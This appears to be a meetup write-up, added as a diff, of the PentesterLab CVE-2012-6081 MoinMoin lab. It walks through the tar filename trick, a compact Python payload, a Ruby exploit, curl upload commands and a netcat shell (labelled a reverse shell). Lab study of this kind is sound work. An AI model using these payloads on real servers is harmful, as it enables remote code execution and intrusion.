@@ -1,0 +1,338 @@
+.. include:: /pentest_links.txt
+
+.. _moinmoin:
+
+********
+MoinMoin
+********
+
+A real-world MoinMoin exploit of Debian
+=======================================
+
+
+The challenge
+-------------
+
+This is to document the meetup's efforts responding to the challenge `CVE-2012-6081: MoinMoin code execution <https://pentesterlab.com/exercises/cve-2012-6081>`_. This document owes much to two writeups. First `CVE-2012-6081: MoinMoin code execution - Introduction <https://pentesterlab.com/exercises/cve-2012-6081/course>`_ which shows a ``ruby``-based exploit, and `GitHub shaynewang/exploits/moinmoin.py <https://github.com/shaynewang/exploits/blob/master/moinmoin.py>`_ which shows a ``python3``-based exploit.
+
+Please review `GitHub shaynewang/exploits CVE-2012-6081: MoinMoin code execution <https://github.com/shaynewang/exploits>`_ for the key vulnerabilites being exploited plus the fact that the browsers you likely have on hand (Firefox and Chrome) won't run the required Java applet.
+
+What we'll add here is doing the exploit using the bash shell.
+
+
+The software fix
+----------------
+
+The problem was an injection of user data, which is fixed via these highlighted lines:
+
+.. code-block:: bash
+  :emphasize-lines: 3-4
+
+  def execute(pagename, request):
+      target = request.values.get('target')
+      target = wikiutil.taintfilename(target)
+
+      cwd = AnyWikiDraw(request, pagename, target)
+
+      do = request.values.get('do')
+
+
+A 100-byte exploit
+==================
+
+
+``tar`` and 100 byte filenames
+------------------------------
+
+From `GNU and old GNU tar format <https://www.gnu.org/software/tar/manual/html_chapter/tar_8.html#SEC145>`_: "GNU tar was based on an early draft of the POSIX 1003.1 ustar standard. GNU extensions to tar, such as the support for file names longer than 100 characters, use portions of the tar header record which were specified in that POSIX draft as unused."
+
+This leads to filenames longer than 100 bytes **not** being the first bytes in a tar file containing exactly 1 file:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # 100 byte filenames start the tar archive
+  NAME100=$(printf "0123456789%.0s" {0..9})
+  echo ${#NAME100}
+  # OUTPUT:
+  # 100
+  echo "hello" > $NAME100
+  tar --create --file tar100.tar $NAME100
+  cat tar100.tar
+  # OUTPUT:
+  # 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414615023236 0ustar  hacker12hacker12hello
+
+  # >= 101 byte filenames do not start the tar archive
+  NAME101=${NAME100}0
+  echo ${#NAME101}
+  # OUTPUT:
+  # 101
+  echo "hello" > $NAME101
+  tar --create --file tar101.tar $NAME101
+  cat tar101.tar
+  # ././@LongLink0000644000000000000000000000014600000000000011604 Lustar  rootroot0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789001234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890000640000175100017520000000000613322414743023240 0ustar  hacker12hacker12hello
+
+
+Fitting an exploit in 100 bytes
+-------------------------------
+
+The exploit is based on a file upload that is stored in a tar archive where:
+
+* You control the tar archive filename: moinexec.py so it's treated by MoinMoin as an executable python file and not a tar file.
+
+* You mostly control the filename for the input file to tar: "debug." + an extension, which can textually be python code.
+
+* As long as the "filename" (python code) is <= 100 bytes, it will be the first bytes in the tar archive: you have uploaded executable python code.
+  
+Here is a simple python script to execute a shell command:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  import os
+  def execute(pagename, request):
+    stream = os.popen(request.values['cmd'])
+    request.write(stream.read())
+
+But this code must have the filename "drawing[.ext]" where "drawing" is fixed and the extension we can control. Here goes the next attempt:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  cat > cmd.py <<'EOF'
+  drawing.z if()else()
+  import os
+  def execute(pagename, request):
+    stream = os.popen(request.values['cmd'])
+    request.write(stream.read())
+  EOF
+  wc -c cmd.py
+  # OUTPUT:
+  # 137
+
+That's too long, so reaching in the python bag of tricks, this does the job:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  cat > payload.py <<'EOF'
+  drawing.r if()else()
+  import os
+  def execute(p,r):exec"print>>r,os\56popen(r\56values['c'])\56read()"
+  EOF
+  wc -c payload.py
+
+It's actually possible to shrink the size down even further by passing the shell command in the HTTP Host header (``Host: uname -a``), but we won't do that.
+
+
+Getting the form parameters
+===========================
+
+Normally you'd use something like :program:`zap` or :program:`burpsuite` to intercept browser traffic and determine the form parameters. Since you probably don't have a Java-capable browser handy, you can run the PentesterLab ruby exploit and use ``ngrep`` to capture the form traffic. NOTE: the code has 1 correction from the original PentesterLab writeup:
+
+.. code-block:: bash
+  :emphasize-lines: 32-34
+
+  # Update /etc/hosts to have vulnerable host
+  IP=192.168.122.99
+  echo "$IP vulnerable" | sudo tee -a /etc/hosts
+
+  cat > exploit.rb <<'EOF'
+  require 'socket'
+
+  # function used to send request
+  # does not support chunk, gzip, zlib :p
+  def ssend(req) #{{
+    socket=TCPSocket.new('vulnerable',80)
+    puts req  
+    socket.write(req)
+    resp = ""
+    s=""
+    while (s= socket.readline and !s.nil? )
+      puts s
+      resp+= s
+      break if s =~ /^\r\n$/
+    end
+    if resp=~ /^Content-Length:\s+(\d+)\s*$/i
+      resp+= socket.read($1.to_i)
+    else 
+      resp = socket.read
+    end
+    resp
+  end #}}
+
+  # getting  valid ticket
+  resp = ssend("GET /moin/WikiSandBox?action=twikidraw&do=modify&target=../../../../data/plugin/action/moinexec.py HTTP/1.0\r\nHost: vulnerable\r\n\r\n")
+  # CORRECTION HERE "&" ==> "&amp;"
+  # OLD - if resp =~ /ticket=(.*?)&target=/
+  if resp =~ /ticket=(.*?)&amp;target=/
+    ticket = $1
+  end
+
+  head = "POST /moin/WikiSandBox?action=twikidraw&do=save&ticket=#{ticket}&target=../../../../data/plugin/action/moinexec.py HTTP/1.1\r\nHost: vulnerable\r\nContent-Type: multipart/form-data; boundary=pentesterlab\r\nContent-Length: "
+
+  payload = "drawing.s if()else()\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\""
+
+  # Building the request's body:
+
+  body = "--pentesterlab\r\n"
+
+  # Payload:
+  body += "Content-Disposition: form-data; name=\"filename\"\r\nContent-Type: image/png\r\n\r\n#{payload}\r\n--pentesterlab\r\n"
+
+  # File content:
+  body += "Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\nContent-Type: image/png\r\n\r\nBLAH\r\n--pentesterlab--\r\n"
+
+  #Final request
+  puts head+body.size.to_s+"\r\n\r\n"+body
+  puts ssend(head+body.size.to_s+"\r\n\r\n"+body)
+  EOF
+
+In one terminal window start ``ngrep``:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  LINK=virbr0
+  sudo ngrep -l -p -d $LINK \
+    "^GET |^POST " tcp and port 80 and host vulnerable
+
+In another terminal run the ruby exploit:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  ruby exploit.rb
+
+The captured data is:
+
+.. code-block:: text
+  :emphasize-lines: 1
+
+  #####################################
+  T 192.168.122.1:52262 -> 192.168.122.99:80 [AP] #144
+    GET /moin/WikiSandBox?action=twikidraw&do=modify&target=../../../../data/pl
+    ugin/action/moinexec.py HTTP/1.0..Host: vulnerable....
+  #################################
+  T 192.168.122.1:52264 -> 192.168.122.99:80 [AP] #177
+    POST /moin/WikiSandBox?action=twikidraw&do=save&ticket=&target=../../../../
+    data/plugin/action/moinexec.py HTTP/1.1..Host: vulnerable..Content-Type: mu
+    ltipart/form-data; boundary=pentesterlab..Content-Length: 333....--penteste
+    rlab..Content-Disposition: form-data; name="filename"..Content-Type: image/
+    png....drawing.s if()else().import os.def execute(p,r):exec"print>>r,os\56p
+    open(r\56values['c'])\56read()"..--pentesterlab..Content-Disposition: form-
+    data; name="filepath"; filename="drawing.png"..Content-Type: image/png....B
+    LAH..--pentesterlab--..
+
+Cleaned up the POST looks like:
+
+.. code-block:: text
+  :emphasize-lines: 1
+
+  POST /moin/WikiSandBox?action=twikidraw&do=save&ticket=&target=../../../../data/plugin/action/moinexec.py HTTP/1.1
+  Host: vulnerable
+  Content-Type: multipart/form-data; boundary=pentesterlab
+  Content-Length: 333
+
+  --pentesterlab
+  Content-Disposition: form-data; name="filename"
+  Content-Type: image/png
+
+  drawing.s if()else()
+  import os.def execute(p,r):exec"print>>r,os\56popen(r\56values['c'])\56read()"
+  --pentesterlab
+  Content-Disposition: form-data; name="filepath";filename="drawing.png"
+  Content-Type: image/png
+
+  BLAH
+  --pentesterlab--
+
+When done, stop the ``ngrep`` capture. The first HTTP request is equivalent to this ``curl``:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  curl --silent --get http://$TARGET/moin/WikiSandBox \
+    --data-urlencode action=twikidraw \
+    --data-urlencode do=modify \
+    --data-urlencode target=../../../../data/plugin/action/moinexec.py
+
+From the ruby code, the whole purpose of this is to get a ticket to be used in the second request. Here goes the gist of the second request (note that TICKET and PAYLOAD strings haven't been defined yet):
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  curl -v --silent "http://$TARGET/moin/WikiSandBox?action=twikidraw&do=save&ticket=$TICKET&target=../../../../data/plugin/action/moinexec.py" \
+    --form filename="$PAYLOAD" \
+    --form filepath="@drawing.png;type=image/png"
+
+Note this is a mix of HTTP GET and a POST with ``multipart/form-data``: you cannot use ``--data-urlencode`` as ``curl`` does not allow mixiing ``--data-urlencode`` and ``--form``.
+
+Note that it's likely MoinMoin is located at :file:`/var/www/moin` and the plugin directory is at :file:`/var/lib/moin/data/plugin/action/`
+
+
+The exploit using bash
+======================
+
+
+Upload the python exploit
+-------------------------
+
+This uploads the python exploit. Make sure that the target file does not already exist (delete it or choose an unused filename if it does).
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # NOTE: vulnerable must be in /etc/hosts
+  TARGET=vulnerable
+
+  TICKET=$(curl -v --silent --get http://$TARGET/moin/WikiSandBox \
+    --data-urlencode action=twikidraw \
+    --data-urlencode do=modify \
+    --data-urlencode target=../../../../data/plugin/action/moinexec.py \
+    | grep 'ticket=' | sed 's/^.*ticket=//;s/\&.*//')
+  echo ticket=$TICKET
+
+  cat > payload.py <<'EOF'
+  drawing.r if()else()
+  import os
+  def execute(p,r):exec"print>>r,os\56popen(r\56values['c'])\56read()"
+  EOF
+  PAYLOAD=$(cat payload.py)
+
+  echo "BLAH" > drawing.png
+
+  curl -v --silent "http://$TARGET/moin/WikiSandBox?action=twikidraw&do=save&ticket=$TICKET&target=../../../../data/plugin/action/moinexec.py" \
+    --form filename="$PAYLOAD" \
+    --form filepath="@drawing.png;type=image/png" \
+    --trace-ascii -
+
+
+The reverse shell
+-----------------
+
+In one terminal window start up a shell using ``nc``:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  TARGET=vulnerable
+  curl --silent "http://$TARGET/moin/WikiSandBox" \
+    --data-urlencode action=moinexec \
+    --data-urlencode "c=nc -l -p 9999 -e /bin/sh"
+
+In another terminal window connect to the reverse shell:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  TARGET=vulnerable
+  PORT=9999
+  nc $TARGET $PORT
+  # In the resulting shell
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  id
+  hostname
+  uname -a
+  pwd
+  exit
